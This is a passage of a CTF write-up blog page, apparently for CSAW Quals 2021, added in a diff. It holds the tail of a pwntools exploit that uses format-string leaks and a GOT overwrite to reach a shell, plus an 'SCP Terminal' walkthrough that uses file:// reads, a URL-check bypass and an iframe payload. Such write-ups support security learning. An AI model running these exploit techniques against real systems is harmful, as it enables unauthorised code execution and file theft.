+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%7$lx.%45$lx&quot;
+</span><span>    f </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)
+</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Report 1:</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    prog, libc </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;.&quot;</span><span>)
+</span><span>    program_base, libc_base </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(prog</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x374c</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x270b3</span><span>)
+</span><span>    memset_got </span><span style="color:#f29e74;">= </span><span>program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x36b8
+</span><span>    system_addr </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x55410
+</span><span>    free_hook </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000000000039b788
+</span><span>    one_gadget </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3f35a
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;program base: </span><span>{</span><span style="color:#f28779;">hex</span><span>(program_base)}</span><span style="color:#bae67e;">, libc base: </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;memset_got: </span><span>{</span><span style="color:#f28779;">hex</span><span>(memset_got)}</span><span style="color:#bae67e;">, system_addr: </span><span>{</span><span style="color:#f28779;">hex</span><span>(system_addr)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    context</span><span style="color:#f29e74;">.</span><span>bits </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">64
+</span><span>    context</span><span style="color:#f29e74;">.</span><span>arch </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;amd64&#39;
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exec_fmt</span><span>(</span><span style="color:#ffcc66;">payload</span><span>):
+</span><span>        p </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">process</span><span>()
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Report 1 in this batch!!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
+</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
+</span><span>        </span><span style="color:#ffa759;">return </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()
+</span><span>    
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">fmtstr_payload</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span>{memset_got</span><span style="color:#ccc9c2cc;">: </span><span>system_addr}</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">write_size</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;byte&#39;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">import </span><span>time
+</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
+</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
+</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    number </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    data </span><span style="color:#f29e74;">= </span><span>[(</span><span style="color:#ffcc66;">11001</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cd80d3cd8a479a18bbc9652f3631c61c&quot;</span><span>)]
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
+</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_1</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
+</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
+</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_2</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
+</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
+</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_3</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
+</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">16</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
+</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_4</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span>number </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">50</span><span>)
+</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p><img src="/csaw-quals-2021/aeg_flag.png" alt="" /></p>
+<h1 id="scp-terminal"><a href="/csaw-quals-2021/scp-terminal">SCP Terminal</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Every since you started working this administrative government job, things have gotten strange. It&#39;s not just because your day is spent cataloging an archive of anomalous objects. In your dreams you see a burning number: 31337 Maybe this terminal can help uncover the meaning of these dreams.
+</span></code></pre>
+<p><img src="/csaw-quals-2021/scp_terminal_landing.png" alt="" /></p>
+<p>The Explore Archive button opens up a random SCP-wiki page and the Contain SCP button will open up the provided URL on the server and show a screenshot. It'll only work if the URL contains "scp-" so I added "?test=scp-wiki" to the end of the URL to bypass the check.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Using the URL "view-source:file:///server?test=scp-wiki" prints a list of all the server files. I used view-source because it wasn't rendering the file listing directly for some reason.</p>
+<p><img src="/csaw-quals-2021/scp_terminal_serverdir.png" alt="" /></p>
+<p>There are a few interesting files there; but let's look at server.py first.</p>
+<p><img src="/csaw-quals-2021/scp_terminal_serverpy.png" alt="" /></p>
+<p>Hey, we have arbitrary file read; What if I just view the flag template?</p>
+<p><img src="/csaw-quals-2021/scp_terminal_scp31337.png" alt="" /></p>
+<p>Ahahaha I should've expected that. The next thing I tried was viewing the source, but the viewport wasn't big enough to see the flag. I was stuck on this stage for a while until I found some functionality which let me upload a file to the server by viewing a page like this.</p>
+<pre data-lang="html" style="background-color:#212733;color:#ccc9c2;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">html</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">head</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">head</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">body</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">div </span><span style="color:#ffd580;">class</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;scp-image-block&quot;</span><span style="color:#5ccfe690;">&gt;
+</span><span>	</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">img  </span><span style="color:#ffd580;">src</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;http://822f-128-194-3-233.ngrok.io/exploit.html&quot;</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">div</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">body</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">html</span><span style="color:#5ccfe690;">&gt;
+</span></code></pre>
+<p><img src="/csaw-quals-2021/scp_terminal_contain.png" alt="" /></p>
+<p>The server won't serve contained non-image files but it doesn't matter all that much because we have arbitrary file read by way of file://. I actually wrote a payload that worked in my testing, was really excited to test on the server only to find it didn't work -- Firefox considers file &lt;-&gt; file to be the same origin but Chrome does not so I couldn't access the contents of the iframe. I read the documentation on iframes and found the csp attribute; which lets me control the content security policy of the child page. The flag was in the viewport of scp_31337.html, just obfuscated by css. I wrote a quick HTML to iframe the file with CSS disabled and then got the flag.</p>
+<pre data-lang="html" style="background-color:#212733;color:#ccc9c2;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">html</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">head</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">head</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">body</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">iframe </span><span style="color:#ffd580;">id</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;frame&quot; </span><span style="color:#ffd580;">src</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;file:///server/templates/scp-31337.html&quot;
+</span><span>            </span><span style="color:#ffd580;">title</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;iframe Example 1&quot; </span><span style="color:#ffd580;">width</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;720&quot; </span><span style="color:#ffd580;">height</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;400&quot; </span><span style="color:#ffd580;">csp</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;style-src none&quot;</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">iframe</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">body</span><span style="color:#5ccfe690;">&gt;
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">html</span><span style="color:#5ccfe690;">&gt;
+</span></code></pre>
+<p><img src="/csaw-quals-2021/scp_terminal_flag.png" alt="" /></p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">12 September 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
